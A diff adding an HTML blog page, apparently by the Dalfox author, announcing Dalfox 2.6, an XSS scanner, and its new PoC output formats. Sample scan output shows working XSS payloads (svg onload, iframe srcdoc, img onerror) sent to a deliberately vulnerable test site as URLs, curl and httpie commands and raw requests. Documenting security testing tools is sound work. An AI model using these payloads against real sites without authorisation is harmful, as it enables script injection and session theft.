@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>Dalfox 2.6 Released 🎉 | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="Offensive Security Engineer, Developer and H4cker.">
+    
+
+    
+    <meta property="og:title" content="Dalfox 2.6 Released 🎉">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2021/dalfox-2-6/">
+  <meta property="og:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Dalfox 2.6 Released 🎉">
+  <meta name="twitter:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2021/dalfox-2-6/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"Dalfox 2.6 Released 🎉","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2021/dalfox-2-6/","datePublished":"2021-11-21T00:00:00+00:00","dateModified":"2021-12-25T00:00:00+00:00","image":"https://user-images.githubusercontent.com/13212227/142735655-93e2b8c8-1916-4ecd-b497-68acf8da4425.jpg"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Blog","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2021/"},{"@type":"ListItem","position":5,"name":"Dalfox 2.6 Released 🎉"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">Dalfox 2.6 Released 🎉</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2021-11-21">
+                        NOVEMBER 21, 2021
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">Offensive Security Engineer, Developer and H4cker.</p>
+            
+        </header>
+
+        <div class="post-body"><p>Wow! Dalfox 2.6.0 has finally been released! This time, I improved the focus on Result and PoC object. and a new global flag called --poc-type was added. Let's play it quickly 😎</p>
+<p>https://github.com/hahwul/dalfox/releases/tag/v2.6.0</p>
+<h2 id="release-note">Release note</h2>
+<ul>
+<li>Improve scanning performance</li>
+<li>Improve result and poc object, printing methods
+<ul>
+<li>Object (when use in the code, when use in the server mode and json result)
+<ul>
+<li>Added InjectType</li>
+<li>Added PoCType</li>
+<li>Added Method</li>
+<li>Added Param</li>
+<li>Added Payload</li>
+<li>Added Evidence</li>
+<li>Added CWE</li>
+</ul>
+</li>
+<li>Printing
+<ul>
+<li>All PoC outputs now have a common output logic based on the above objects.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>New flag (--poc-type)
+<ul>
+<li>curl</li>
+<li>httpie</li>
+<li>http-request</li>
+</ul>
+</li>
+<li>And Fixed bug :D</li>
+</ul>
+<h2 id="new-flag-poctype">New flag - PocType</h2>
+<h3 id="poc-typeplain-or-not-set">--poc-type=plain or not set</h3>
+<p>This is the basic output you've seen for a long time.</p>
+<pre><code>dalfox url {target}
+...
+
+[V] Triggered XSS Payload (found DOM Object): artist='&quot;&gt;&lt;svg/class=dalfox onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#00116&amp;#40&amp;#41&amp;#x2f&amp;#x2f
+    48 line:  syntax to use near ''&quot;&gt;&lt;svg/class=dalfox onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#00116&amp;#40&amp;#
+[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/listproducts.php?artist=123%27%22%3E%3Csvg%2Fclass%3Ddalfox+onload%3D%26%2397%26%23108%26%23101%26%23114%26%2300116%26%2340%26%2341%26%23x2f%26%23x2f
+</code></pre>
+<h3 id="poc-typecurl">--poc-type=curl</h3>
+<p>You can print it out with the curl command.</p>
+<pre><code>dalfox url {target} --poc-type=curl
+...
+
+[V] Triggered XSS Payload (found DOM Object): cat=&quot;&gt;&lt;SvG/onload=alert(1) id=dalfox&gt;
+    48 line:  syntax to use near '&quot;&gt;&lt;SvG/onload=alert(1) id=dalfox&gt;' at line 1
+[POC][V][GET][inHTML-URL] curl -i -k http://testphp.vulnweb.com/listproducts.php?artist=123&amp;cat=%22%3E%3CSvG%2Fonload%3Dalert%281%29+id%3Ddalfox%3E
+</code></pre>
+<h3 id="poc-typehttpie">--poc-type=httpie</h3>
+<p>You can print it out with the httpie command.</p>
+<pre><code>dalfox url {target} --poc-type=httpie
+...
+
+[V] Triggered XSS Payload (found DOM Object): cat=&lt;iframe srcdoc=&quot;&lt;input onauxclick=alert(1)&gt;&quot; class=dalfox&gt;&lt;/iframe&gt;
+    48 line:  yntax to use near '=&lt;iframe srcdoc=&quot;&lt;input onauxclick=alert(1)&gt;&quot; class=dalfox&gt;&lt;/
+[POC][V][GET][inHTML-none(1)-URL] http http://testphp.vulnweb.com/listproducts.php?artist=123&amp;cat=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dalert%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E --verify=false
+</code></pre>
+<h3 id="poc-typehttp-request">--poc-type=http-request</h3>
+<p>You can view the HTTP Raw Request. This can be easier to analyze because it leaves detailed information.</p>
+<pre><code>dalfox url {target} --poc-type=http-request
+
+[V] Triggered XSS Payload (found DOM Object): artist='&gt;&lt;img/src/onerror=.1|alert`` class=dalfox&gt;
+    48 line:  syntax to use near ''&gt;&lt;img/src/onerror=.1|alert`` class=dalfox&gt;' at line 1
+[POC][V][GET][inHTML-URL] HTTP RAW REQUEST
+GET /listproducts.php?artist=123%27%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip
+</code></pre>
+<p><img loading="lazy" src="https://user-images.githubusercontent.com/13212227/142735699-2b286152-461f-4ea9-8abb-48da0770c71f.png" alt="" /></p>
+<h2 id="objects-and-json">Objects and JSON</h2>
+<h3 id="poc-struct-and-description">PoC Struct and Description</h3>
+<pre><code class="language-go hljs"><span class="hljs-keyword">type</span> PoC <span class="hljs-keyword">struct</span> <span class="hljs-punctuation">{</span>
+	Type       <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;type&quot;`</span>
+	InjectType <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;inject_type&quot;`</span>
+	PoCType    <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;poc_type&quot;`</span>
+	Method     <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;method&quot;`</span>
+	Data       <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;data&quot;`</span>
+	Param      <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;param&quot;`</span>
+	Payload    <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;payload&quot;`</span>
+	Evidence   <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;evidence&quot;`</span>
+	CWE        <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;cwe&quot;`</span>
+<span class="hljs-punctuation">}</span>
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Key</th>
+<th>Description</th>
+<th>List</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>type</td>
+<td>Type</td>
+<td>- G (Grep)&lt;br /&gt;- R (Reflected)&lt;br /&gt;- V (Verified)</td>
+</tr>
+<tr>
+<td>inject_type</td>
+<td>Injected point</td>
+<td>- inHTML-none (Injected in HTML area)&lt;br /&gt;- inJS-none (Injected in Javascript area)&lt;br /&gt;- inJS-double (Injected within <code>&quot;</code> in Javascript area)&lt;br /&gt;- inJS-single (Injected within <code>&#39;</code> in Javascript area)&lt;br /&gt;- inJS-backtick (Injected within backtic1k in Javascript area)&lt;br /&gt;- inATTR-none (Injected within in Tag attribute area)&lt;br /&gt;- inATTR-double (Injected within <code>&quot;</code> in Tag attribute area)&lt;br /&gt;- inATTR-single (Injected within <code>&#39;</code> in Tag attribute area)</td>
+</tr>
+<tr>
+<td>poc_type</td>
+<td>Type of poc code</td>
+<td>- plain (URL)&lt;br /&gt;- curl (Curl command)&lt;br /&gt;- httpie (HTTPie command)</td>
+</tr>
+<tr>
+<td>method</td>
+<td>HTTP Method</td>
+<td>- GET/POST/PUT/DELETE, etc...</td>
+</tr>
+<tr>
+<td>data</td>
+<td>PoC (URL)</td>
+<td>- PoC URL</td>
+</tr>
+<tr>
+<td>param</td>
+<td>Parameter name</td>
+<td>- Weak parameter name</td>
+</tr>
+<tr>
+<td>payload</td>
+<td>Paramter value</td>
+<td>- Attack code in value</td>
+</tr>
+<tr>
+<td>evidence</td>
+<td>Evidence with repsonse body</td>
+<td>- Simple codeview of where it&#39;s injected in response body.</td>
+</tr>
+<tr>
+<td>cwe</td>
+<td>CWE ID</td>
+<td>- Mapping CWE ID</td>
+</tr>
+</tbody>
+</table>
+<h3 id="json-format-and-example">JSON Format and Example</h3>
+<pre><code class="language-json hljs"><span class="hljs-punctuation">{</span>
+      <span class="hljs-name">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Type of PoC (G/R/V)&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-name">&quot;inject_type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Injected Point&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-name">&quot;poc_type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;plain/curl/httpie/etc...&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-name">&quot;method&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;HTTP Method&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-name">&quot;data&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;PoC URL&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-name">&quot;param&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Parmeter&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-name">&quot;payload&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Attack Value&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-name">&quot;evidence&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Evidence with response body&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-name">&quot;cwe&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;CWE ID&quot;</span>
+   <span class="hljs-punctuation">}</span>
+
+</code></pre>
+<pre><code class="language-json hljs"><span class="hljs-punctuation">{</span>
+      <span class="hljs-name">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;V&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-name">&quot;inject_type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;inHTML-URL&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-name">&quot;poc_type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-name">&quot;method&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;GET&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-name">&quot;data&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&lt;http://testphp.vulnweb.com/listproducts.php?artist=123%27%22%3E%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dalert%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E&gt;&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-name">&quot;param&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;artist&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-name">&quot;payload&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&#39;\\&quot;</span>\\u<span class="hljs-number">0</span><span class="hljs-number">0</span><span class="hljs-number">3</span>e\\u<span class="hljs-number">0</span><span class="hljs-number">0</span><span class="hljs-number">3</span>ciframe srcdoc=\\<span class="hljs-string">&quot;\\u003cinput onauxclick=alert(1)\\u003e\\&quot;</span> class=dalfox\\u<span class="hljs-number">0</span><span class="hljs-number">0</span><span class="hljs-number">3</span>e\\u<span class="hljs-number">0</span><span class="hljs-number">0</span><span class="hljs-number">3</span>c/iframe\\u<span class="hljs-number">0</span><span class="hljs-number">0</span><span class="hljs-number">3</span>e<span class="hljs-string">&quot;,
+</span><span class="hljs-string">      &quot;</span>evidence<span class="hljs-string">&quot;:&quot;</span><span class="hljs-number">48</span> line<span class="hljs-punctuation">:</span>  syntax to use near &#39;&#39;\\<span class="hljs-string">&quot;\\u003e\\u003ciframe srcdoc=\\&quot;</span>\\u<span class="hljs-number">0</span><span class="hljs-number">0</span><span class="hljs-number">3</span>cinput onauxclick=alert(<span class="hljs-number">1</span>)\\u<span class="hljs-number">0</span><span class="hljs-number">0</span><span class="hljs-number">3</span>e\\<span class="hljs-string">&quot; class=dalfox&quot;</span><span class="hljs-punctuation">,</span>
+      <span class="hljs-name">&quot;cwe&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;CWE-79&quot;</span>
+   <span class="hljs-punctuation">}</span>
+
+</code></pre>
+<p><img loading="lazy" src="https://user-images.githubusercontent.com/13212227/142735696-160b4d8e-db22-4b15-8510-b3d371e1db52.png" alt="" /></p>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
